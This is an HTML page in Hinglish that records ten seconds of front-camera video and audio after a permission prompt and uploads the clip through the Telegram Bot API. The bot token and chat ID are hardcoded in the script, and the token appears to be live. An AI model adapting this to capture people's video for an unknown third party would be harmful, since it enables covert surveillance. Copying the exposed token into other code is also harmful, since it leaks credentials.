<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>10 Second Recorder</title>
<style>
  :root {
    --bg: #f5f5f7;
    --card-bg: #ffffff;
    --text: #1a1a1a;
    --muted: #666;
    --accent: #2563eb;
    --danger: #dc2626;
    --success: #16a34a;
    --border: #e5e5e5;
  }
  @media (prefers-color-scheme: dark) {
    :root {
      --bg: #121212;
      --card-bg: #1e1e1e;
      --text: #f0f0f0;
      --muted: #aaa;
      --border: #333;
    }
  }
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: var(--bg);
    color: var(--text);
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
  }
  .card {
    background: var(--card-bg);
    border-radius: 16px;
    padding: 24px;
    max-width: 420px;
    width: 100%;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    text-align: center;
  }
  h1 { font-size: 1.3rem; margin-bottom: 8px; }
  p.sub { color: var(--muted); font-size: 0.9rem; margin-bottom: 20px; }
  video {
    width: 100%;
    border-radius: 12px;
    background: #000;
    margin-bottom: 16px;
    max-height: 320px;
  }
  button {
    width: 100%;
    padding: 14px;
    border-radius: 10px;
    border: none;
    font-size: 1rem;
    font-weight: 600;
    cursor: pointer;
    margin-top: 8px;
  }
  .btn-primary { background: var(--accent); color: white; }
  .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
  #status {
    margin-top: 16px;
    font-size: 0.9rem;
    color: var(--muted);
    min-height: 20px;
  }
  .countdown {
    font-size: 2rem;
    font-weight: 700;
    color: var(--danger);
    margin: 10px 0;
  }
  .ok { color: var(--success); }
  .err { color: var(--danger); }
</style>
</head>
<body>
<div class="card">
  <h1>📹 10 Second Recording</h1>
  <p class="sub">Camera permission maangega, 10 second record karega, phir Telegram par bhej dega.</p>

  <video id="preview" autoplay muted playsinline></video>
  <div class="countdown" id="countdown"></div>

  <button id="startBtn" class="btn-primary">Camera Shuru Karo &amp; Record Karo</button>

  <div id="status"></div>
</div>

<script>
  // ====== APNE DETAILS YAHAN DAALO ======
  const BOT_TOKEN = "9214949202:AAHcsbPkw4eXUSLYc8VvkU0Bog_HUaFDuaA"; // @BotFather se mila token
  const CHAT_ID = "7170605564";
  // =======================================

  const startBtn = document.getElementById('startBtn');
  const preview = document.getElementById('preview');
  const statusEl = document.getElementById('status');
  const countdownEl = document.getElementById('countdown');

  let mediaRecorder;
  let chunks = [];

  startBtn.addEventListener('click', async () => {
    startBtn.disabled = true;
    statusEl.textContent = '';
    statusEl.className = '';

    try {
      statusEl.textContent = 'Camera permission maang rahe hain...';
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: true
      });

      preview.srcObject = stream;
      chunks = [];

      mediaRecorder = new MediaRecorder(stream, {
        mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')
          ? 'video/webm;codecs=vp9,opus'
          : 'video/webm'
      });

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = async () => {
        stream.getTracks().forEach(track => track.stop());
        const blob = new Blob(chunks, { type: 'video/webm' });
        statusEl.textContent = 'Recording ban gayi. Telegram par bhej rahe hain...';
        statusEl.className = '';
        await sendToTelegram(blob);
      };

      mediaRecorder.start();
      statusEl.textContent = 'Recording shuru...';

      let secondsLeft = 10;
      countdownEl.textContent = secondsLeft;
      const timerInterval = setInterval(() => {
        secondsLeft--;
        countdownEl.textContent = secondsLeft > 0 ? secondsLeft : '';
        if (secondsLeft <= 0) clearInterval(timerInterval);
      }, 1000);

      setTimeout(() => {
        if (mediaRecorder.state !== 'inactive') {
          mediaRecorder.stop();
        }
      }, 10000);

    } catch (err) {
      statusEl.textContent = 'Error: Camera permission nahi mili ya koi dikkat hui. (' + err.message + ')';
      statusEl.className = 'err';
      startBtn.disabled = false;
    }
  });

  async function sendToTelegram(blob) {
    if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
      statusEl.textContent = 'Bot Token set nahi hai. File kholke BOT_TOKEN variable mein apna token daalo.';
      statusEl.className = 'err';
      startBtn.disabled = false;
      return;
    }

    try {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('video', blob, 'recording.webm');

      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
        method: 'POST',
        body: formData
      });

      const result = await response.json();

      if (result.ok) {
        statusEl.textContent = '✅ Video Telegram par bhej di gayi!';
        statusEl.className = 'ok';
      } else {
        statusEl.textContent = '❌ Error: ' + (result.description || 'Bhejne mein dikkat hui.');
        statusEl.className = 'err';
      }
    } catch (err) {
      statusEl.textContent = '❌ Network error: ' + err.message;
      statusEl.className = 'err';
    } finally {
      startBtn.disabled = false;
      startBtn.textContent = 'Dobara Record Karo';
    }
  }
</script>
</body>
</html>
